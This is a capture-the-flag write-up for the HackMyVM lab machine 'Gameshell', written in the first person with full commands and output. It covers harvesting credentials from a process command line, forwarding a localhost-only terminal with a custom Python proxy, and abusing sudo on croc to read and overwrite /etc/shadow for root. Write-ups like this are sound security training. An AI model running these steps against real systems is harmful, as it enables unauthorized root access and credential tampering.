# Gameshell

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Gameshell | Sublarge | Beginner | HackMyVM |

**Summary:** Gameshell is a beginner-level machine that involves web-based terminal exploitation. The path to root involves enumerating process information in the `/proc` directory to find hidden credentials, bypassing networking restrictions with a custom Python port-forwarder, and exploiting `sudo` privileges on the `croc` file-transfer utility to overwrite sensitive system files.

---

### Recon

First, identified the target's IP address on the local networking using `arp-scan`:
```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l -I eth1
-----[SNIP]-----
192.168.100.11   08:00:27:e9:1f:fc       (Unknown)

13 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.998 seconds (128.13 hosts/sec). 3 responded
```

Target IP: `192.168.100.11`

Performed a comprehensive Nmap scan to identify open ports and running services:

```bash

┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -p- 192.168.100.11
-----[SNIP]-----
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Bash // The Eternal Shell
7681/tcp open  http    ttyd 1.7.7-40e79c7 (libwebsockets 4.3.3-unknown)
|_http-title: ttyd - Terminal
|_http-server-header: ttyd/1.7.7-40e79c7 (libwebsockets/4.3.3-unknown)
MAC Address: 08:00:27:E9:1F:FC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.84 seconds
```
The web server on port 80 contains a basic landing page about the history of Bash, but the source code reveals no hidden leads.

![alt text](image.png)

However, port **7681** hosts `ttyd`, a web-based terminal.

Upon accessing the terminal, I was greeted by a "Gameshell" interface. 


![alt text](image-1.png)

I gained a basic shell as `www-data` and began progressing through the game to **Level 8**, after began system enumeration.

Checking `/etc/passwd` revealed two interesting local users:
- `silo`
- `eviden`

```bash

[mission 8] $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[mission 8] $ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
-----[SNIP]-----
silo:x:1000:1000::/home/silo:/bin/bash
eviden:x:1001:1001::/home/eviden:/bin/bash
```

Find out something that owned by those users.

```bash
[mission 8] $ find / -user silo 2>/dev/null
/home/silo
```
`silo` just basic.

```bash
[mission 8] $ find / -user eviden 2>/dev/null
/home/eviden
/proc/370
-----[SNIP]-----
```

Inspecting the command line arguments of process **370** (owned by `eviden`), I discovered plain-text credentials for a `ttyd` instance running locally on the loopback address:

```bash
[mission 8] $ cat /proc/370/cmdline
/usr/local/bin/ttyd-i127.0.0.1-p9876-cadmin:nimda-Wbash[mission 8] $ 
[mission 8] $ cat /proc/370/cmdline | tr '\0' ' '
/usr/local/bin/ttyd -i 127.0.0.1 -p 9876 -c admin:nimda -W bash [mission 8] $ 
```

- Internal Port: `9876`
- Credentials: `admin:nimda`

### Lateral Movement

The discovered service is restricted to `127.0.0.1` (localhost), meaning it isn't accessible from my attacker machine. I needed to perform port redirection.

```bash
[mission 8] $ socat TCP-LISTEN:8888,fork,reuseaddr TCP:127.0.0.1:9876
bash: socat: command not found
```

Since `socat` was not installed on the target, I wrote a custom Python script to act as a TCP proxy.

This script listens on port `8888` on all interfaces and tunnels traffic to the internal port `9876`.

```bash
import socket
import threading

def pipe(source, destination):
    while True:
        try:
            data = source.recv(4096)
            if not data:
                break
            destination.sendall(data)
        except:
            break
    source.close()
    destination.close()

def start_proxy(local_port, remote_host, remote_port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', local_port))
    server.listen(10)
    print(f"[*] Proxying 0.0.0.0:{local_port} -> {remote_host}:{remote_port}")
    
    while True:
        client_sock, addr = server.accept()
        remote_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote_sock.connect((remote_host, remote_port))
        
        threading.Thread(target=pipe, args=(client_sock, remote_sock)).start()
        threading.Thread(target=pipe, args=(remote_sock, client_sock)).start()

if __name__ == "__main__":
    start_proxy(8888, '127.0.0.1', 9876)
```

Run it. 

```bash
[mission 8] $ python3 soc.py
[*] Proxying 0.0.0.0:8888 -> 127.0.0.1:9876
```
After running `python3 soc.py`, I accessed `http://192.168.100.11:8888` in my browser and logged in with `admin:nimda`. I successfully gained access as the user **eviden**.

![alt text](image-2.png)

```bash
eviden@GameShell:/$ id
uid=1001(eviden) gid=1001(eviden) groups=1001(eviden)
```

### PrivEsc

The user `eviden` has a specific sudo permission:

```bash
eviden@GameShell:~$ sudo -l
Matching Defaults entries for eviden on GameShell:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User eviden may run the following commands on GameShell:
    (ALL) NOPASSWD: /usr/local/bin/croc
```

The user eviden has specific sudo permissions that allow running the `croc` binary as root without a password.

First, we must switch `croc` to classic mode to simplify the transfer process.

```bash
eviden@GameShell:~$ croc --classic
Classic mode is currently DISABLED.

Please note that enabling this mode will make the shared secret visible
on the host's process list when passed via the command line. On a
multi-user system, this could allow other local users to access the
shared secret and receive the files instead of the intended recipient.

Do you wish to continue to enable the classic mode? (y/N) y

Classic mode ENABLED.

To send and receive, use the code phrase:

  Send:    croc send --code *** file.txt

  Receive: croc ***
```

Before executing the transfer, we need to set up a relay path on port 7777.

```bash
eviden@GameShell:~$ croc relay --port 7777 &
[1] 9410
[info]  2025/12/30 10:44:00 starting croc relay version v10.2.7
[info]  2025/12/30 10:44:00 starting TCP server on :7777
[info]  2025/12/30 10:44:00 starting TCP server on :7778
[info]  2025/12/30 10:44:00 starting TCP server on :7779
[info]  2025/12/30 10:44:00 starting TCP server on :7780
[info]  2025/12/30 10:44:00 starting TCP server on :7781
```

Our strategy involves the following steps:
- Retrieve the system's shadow file.

- Replace the root password hash with a custom hash.

- Send the modified file back to /etc/shadow to overwrite the original.

- Log in as root using the new custom password.

request the shadow file and move the process to the background.

```bash
eviden@GameShell:~$ sudo croc --relay "127.0.0.1:7777" send /etc/shadow &
[2] 9418
Sending 'shadow' (967 B)         
Code is: 3327-film-lima-uranium

On the other computer run:
(For Windows)
    croc --relay 127.0.0.1:7777 3327-film-lima-uranium
(For Linux/macOS)
    CROC_SECRET="3327-film-lima-uranium" croc --relay 127.0.0.1:7777 
```

Receive the file in the current directory:

```bash
eviden@GameShell:~$ croc --relay "127.0.0.1:7777" --yes 3327-film-lima-uranium
Receiving 'shadow' (967 B) 

Receiving (<-127.0.0.1:60506)
 shadow   0% |                    | ( 0/967 B) [0s:0s]
Sending (->192.168.100.11:45920)
shadow 100% |████████████████████| (967/967 B, 1.4 MB/s)
 shadow 100% |████████████████████| (967/967 B, 42 kB/s)
[2]+  Done                    sudo croc --relay "127.0.0.1:7777" send /etc/shadow
```

Read the shadow:

```bash
eviden@GameShell:~$ cat shadow
root:$6$bkoCye3C7v6PjIpg$xWTOpSaY48JEWNPb77L053NQUkv4V1DNXKvn0XAdzppqYIz4u3qDhp5cU434hPT3SkroGhofehH4sZcInhJkD.:20409:0:99999:7:::
-----[SNIP]-----
```

Next, examine the `shadow` file and focus on the root user entry. Use `openssl` to generate a simple password hash (e.g., for the word "password"):

```bash
eviden@GameShell:~$ openssl passwd "password"
sa3tHJ3/KuYvI
```

Edit the `shadow` file using any text editor (vi, vim, or nano) and replace the existing root hash with the one generated above. The edited file should look like this:

```bash
eviden@GameShell:~$ cat shadow
root:sa3tHJ3/KuYvI:20409:0:99999:7:::
-----[SNIP]-----
```

Overwriting the system shadow file. 

Verify that the relay path is still active using `jobs`. If it has stopped, run again.

```bash
eviden@GameShell:~$ jobs
[1]+  Running                 croc relay --port 7777 &
```

First, send the modified file:

```bash
eviden@GameShell:~$ croc --relay "127.0.0.1:7777" send shadow &
[2] 9439
Sending 'shadow' (874 B)         
Code is: 3540-bali-type-voyage

On the other computer run:
(For Windows)
    croc --relay 127.0.0.1:7777 3540-bali-type-voyage
(For Linux/macOS)
    CROC_SECRET="3540-bali-type-voyage" croc --relay 127.0.0.1:7777 
```

Navigate to the `/etc` directory and receive the file as root to initiate the overwrite. Ensure classic mode is enabled for the root user as well:

```bash
eviden@GameShell:~$ cd /etc
eviden@GameShell:/etc$ sudo croc --relay "127.0.0.1:7777" --yes --overwrite 3540-bali-type-voyage
Receiving 'shadow' (874 B) 

Receiving (<-127.0.0.1:50010)
 shadow   0% |                    | ( 0/874 B) [0s:0s]
Sending (->192.168.100.11:33680)
shadow 100% |████████████████████| (874/874 B, 267 kB/s)
 shadow 100% |████████████████████| (874/874 B, 108 kB/s)
[2]+  Done                    croc --relay "127.0.0.1:7777" send shadow  (wd: ~)
(wd now: /etc)
```

With the `shadow` file overwritten, we can now log in as root using our custom password.

```bash
eviden@GameShell:/etc$ su - root
Password: 
root@GameShell:~# id
uid=0(root) gid=0(root) groups=0(root)
```
Retrieve the flags.

```bash
root@GameShell:~# cat root.txt
flag{root-[REDACTED]}
root@GameShell:~# find / -type f -name "user.txt" 2>/dev/null
/home/silo/user.txt
root@GameShell:~# cat /home/silo/user.txt
flag{user-[REDACTED]}
```